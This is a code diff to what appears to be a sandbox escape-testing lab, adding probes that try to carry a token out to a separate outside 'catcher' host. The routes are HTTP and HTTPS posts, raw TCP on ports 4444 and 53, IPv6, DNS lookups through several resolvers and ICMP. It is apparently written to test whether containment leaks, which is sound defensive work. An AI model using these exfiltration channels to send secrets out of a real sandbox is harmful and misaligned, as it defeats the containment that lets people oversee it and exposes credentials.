@@ -13,6 +13,7 @@ const T = 3000;
 // Addresses outside the sandbox where the lab listens (evals/escape_lab.py writes this file).
 let target = {};
 try { target = JSON.parse(read('/opt/escape-target.json')); } catch {}
+const c = target.catcher;  // { zone, v4, v6 }: the separate box, when the lab has one
 
 // The default gateway, from the routing table (hex, little-endian).
 const gw = (() => {
@@ -125,6 +126,26 @@ const probes = [
   ['private-192', 'private range 192.168.1.1:80', () => tcp('192.168.1.1', 80)],
   // An allowed registry, with the token in the URL: it gets there, but only the registry sees it.
   ['registry-url', 'token in a search URL on registry.npmjs.org (allowed)', () => web(`https://registry.npmjs.org/-/v1/search?text=${token}&size=1`, 'GET')],
+  // The outside catcher: a separate box on the internet, with a real DNS zone delegated to it. Its own log,
+  // not this file, says whether anything arrived.
+  ...(c ? [
+    ['catcher-https-name', 'HTTPS POST to the catcher by its real name', () => web(`https://h443.${c.zone}/x?t=${token}`)],
+    ['catcher-http-name', 'HTTP POST to the catcher by its real name', () => web(`http://h80.${c.zone}/x?t=${token}`)],
+    ['catcher-name-odd-port', 'HTTP POST to the catcher by name, port 4444', () => web(`http://odd.${c.zone}:4444/x?t=${token}`)],
+    ['catcher-v4-http', 'HTTP POST to the catcher\'s IPv4', () => web(`http://${c.v4}/x?t=${token}`)],
+    ['catcher-v4-https', 'HTTPS POST to the catcher\'s IPv4', () => web(`https://${c.v4}/x?t=${token}`)],
+    ['catcher-v4-tcp', 'token over raw TCP to the catcher\'s IPv4, port 4444', () => tcp(c.v4, 4444, 4, loot)],
+    ['catcher-v4-tcp-53', 'token over raw TCP to the catcher\'s IPv4, port 53', () => tcp(c.v4, 53, 4, loot)],
+    ['catcher-v6-http', 'HTTP POST to the catcher\'s IPv6', () => c.v6 ? web(`http://[${c.v6}]/x?t=${token}`) : { outcome: 'skipped' }],
+    ['catcher-v6-tcp', 'token over raw TCP to the catcher\'s IPv6, port 47801', () => c.v6 ? tcp(c.v6, 47801, 6, loot) : { outcome: 'skipped' }],
+    ['catcher-dns-resolver', 'token in a lookup in the catcher\'s zone, system resolver', () => lookup(`${token}.res.${c.zone}`)],
+    ['catcher-dns-gateway', 'token in a lookup in the catcher\'s zone, straight to the gateway', () => gw ? dnsQuery(gw, `${token}.gw.${c.zone}`) : { outcome: 'skipped' }],
+    ['catcher-dns-8888', 'token in a lookup in the catcher\'s zone, straight to 8.8.8.8 (UDP)', () => dnsQuery('8.8.8.8', `${token}.g.${c.zone}`)],
+    ['catcher-dns-1111-tcp', 'token in a lookup in the catcher\'s zone, straight to 1.1.1.1 (TCP)', () => dnsQuery('1.1.1.1', `${token}.cf.${c.zone}`, true)],
+    ['catcher-dns-direct', 'token in a lookup sent straight to the catcher (UDP 53)', () => dnsQuery(c.v4, `${token}.direct.${c.zone}`)],
+    ['catcher-dns-direct-tcp', 'token in a lookup sent straight to the catcher (TCP 53)', () => dnsQuery(c.v4, `${token}.directtcp.${c.zone}`, true)],
+    ['catcher-icmp', 'ping the catcher with token bytes in the payload', () => ping(c.v4)],
+  ] : []),
 ];
 
 (async () => {
